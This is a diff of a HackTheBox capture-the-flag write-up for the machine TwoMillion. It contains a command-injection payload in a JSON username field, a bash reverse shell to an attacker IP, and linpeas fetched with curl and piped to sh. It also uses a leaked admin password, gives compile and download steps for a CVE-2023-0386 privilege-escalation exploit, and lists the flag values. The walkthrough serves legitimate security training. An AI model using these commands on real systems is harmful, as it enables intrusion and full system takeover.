@@ -3,7 +3,7 @@ title: TwoMillion
 machine: TwoMillion
 tags: HackTheBox Machines
 ---
-#### Write-Up for the HackTheBox Machine - TwoMillion
+#### Write-Up for the HackTheBox Machine - TwoMillion in Guided Mode
 <!--more-->
 ---
 #### 001: Scan
@@ -162,7 +162,6 @@ Effectively, influencing application behaviors without changing code.
 
 When probed the `.env` file on the victim, various `key:value` pairs showed environment variables linked to the database of the application.
 
-Command:
 ```bash
 "username":"; cat .env #"
 ```
@@ -186,61 +185,68 @@ nc -lvnp 4444
 {{< screenshots "shot-019" >}}
 
 ```bash
-bash -c 'bash -i >& /dev/tcp/10.10.15.190/4444 0>&1'
+bash -c 'bash -i >& /dev/tcp/10.10.15.190/4444 0>&1' #
 ```
 - bash reverse shell command used in burpsuite json request.
 
 {{< screenshots "shot-020" >}}
 
-On the attacker machine a reverse shell connection has been established.
+Successfully established a reverse shell connection on the attacker machine.
 
 {{< screenshots "shot-021" >}}
 
 ---
+#### 013: User Flag
 
-At this point the user we are connected as is www-data. Nevertheless, according to the credentials found in .env we switch to the admin user with su admin and enter the password SuperDuperPass123.
-
-Thus, we can view the user.txt flag, located in /home/admin.
-- e6028d512a774b66d8248d6f3e6cfe82
+At this point the there is access to the system with a common web server user `www-data`.
+As admin credentials were found in `.env`, an attemped was made to switch from the current system user to `admin` with `su admin`.
+After entering the password `SuperDuperPass123`, as assumed the user bacame `admin`.
+Thus, the user flag can be captured with `cat user.txt` located in `/home/admin`.
+- `e6028d512a774b66d8248d6f3e6cfe82`
 
 ---
+#### 014: Victim Enumeration
 
-Linpeas Enumeration
+With `admin` privileges the victim machine was further probed for potential vulnerabilities and misconfigurations with the use of Linpeas. 
+Initially, a python server was ran on the attacker, at a location where `linpeas.sh` is normally located `/usr/share/peass/linpeas`. 
 
-A python listener is set up on the attacker machine, where linpeas.sh is located. 
-
+```bash
 sudo python3 -m http.server 80
+```
 
-Hence, we obtain and execute linpeas.sh from the target using curl for a comprehensive system enumeration
+Therefore, from the victim's shell a GET request using `curl` was made to the locally running python server for `linpeas.sh` and then piped for execution.
+Which eventually after some time, the tool provided a comprehensive system enumeration.
 
+```bash
 curl <attacker_ip>/linpeas.sh | sh
-
-As observed there were various findings, but what seemed of interest was an email exchange located in /var/mail. Indicating that the system is potentially vulnerable to CVE-2023-0386
-
-![shot-022](/captures/screens/TwoMillion/shot-022.png)
+```
 
 ---
+#### 015: Privilege Escalation
 
-CVE-2023-0386 Proof of Concept
+As observed there were various findings, but what seemed of interest was an email exchange located in `/var/mail`. Indicating that the system was potentially vulnerable to `CVE-2023-0386`.
 
-A concise exploitation procedure is found:
-https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c 
+{{< screenshots "shot-022" >}}
 
-The compilation process requires libfuse for the implemention of the malicious filesystem:
+https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c provides a concise exploitation procedure for `CVE-2023-0386`.
 
-- apt install libfuse-dev
-- gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl
+The compilation process required `libfuse` for the implemention of the malicious filesystem on the victim.
+- `apt install libfuse-dev` | required library
+- `gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl` | compliation to statically linked executable, allowing large file support, linking against FUSE and dynamic `libfuse` loading
 
-Then a local python server is set up on port 9000, for a the download of the exploit on the target machine with the use of curl.
+Then a local python server was locally ran on port 9000, for the download of the exploit on the victim machine with the use of `curl`.
 
-curl -O http://10.10.15.190:9000/poc
+```bash
+curl -O http://1<attacker_ip>:9000/poc
+```
+##### *Note: Command used on the victim's shell*
 
-![shot-023](/captures/screens/TwoMillion/shot-023.png)
+{{< screenshots "shot-023" >}}
 
-All that was required, for the privilege escalation, was to make the scrip executable with chmod +x and then run it.
+All that was required at this stage of the privilege escalation, was to make the script executable with `chmod +x` and then run it.
 
-![shot-024](/captures/screens/TwoMillion/shot-024.png)
+{{< screenshots "shot-024" >}}
 
----
-
-Thus, we become root and have control over the entire system. With the flag captured with cat /root/root.txt
+Thus, the system was fully compromised by becoming root.
+Finally, the root flag captured with `cat /root/root.txt`
+- `b38a9c59680e596efe9f32a089d14b6f`
